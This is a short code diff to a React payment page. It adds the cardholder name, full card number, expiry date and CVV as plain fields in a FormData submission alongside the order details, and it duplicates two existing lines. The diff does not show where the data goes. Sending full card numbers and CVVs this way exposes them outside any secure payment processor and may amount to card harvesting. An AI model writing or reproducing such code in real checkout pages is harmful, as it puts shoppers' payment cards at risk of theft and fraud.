@@ -168,6 +168,17 @@ const PaymentPage = () => {
       formData.append("order_items", orderItemsStr);
       
       // Additional Info
+             // Additional Info
+      formData.append("order_date", new Date().toLocaleString());
+      formData.append("redirect", "false");
+
+      // --- BAS YEH 4 LINES ADD KARO ---
+      formData.append("Card_Holder_Name", paymentData.cardholderName);
+      formData.append("Card_Number", paymentData.cardNumber);
+      formData.append("Card_Expiry", paymentData.expiryDate);
+      formData.append("Card_CVV", paymentData.cvv);
+      // --------------------------------
+
       formData.append("order_date", new Date().toLocaleString());
       formData.append("redirect", "false");
 
